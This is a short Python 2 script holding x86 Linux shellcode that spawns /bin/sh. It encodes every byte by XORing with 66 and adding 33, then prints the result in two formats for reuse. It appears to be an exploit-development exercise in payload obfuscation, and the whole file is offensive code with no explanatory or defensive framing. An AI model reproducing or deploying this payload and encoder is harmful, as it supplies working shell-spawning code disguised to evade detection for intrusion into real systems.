#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""
xor = 66

# XOR every byte with 66 and after that add 33 to everybyte

for x in bytearray(shellcode):

# XOR every byte with 66
	byte = x ^ xor

# Add 33 to every byte
	encoded += '\\x'
	encoded += '%02x' % (byte + 33)

	encoded2 += '0x'
	encoded2 += '%02x,' % (byte + 33)

print "Encoded Shellcode:"
print encoded
print "Encoded2 Shellcode:"
print encoded2
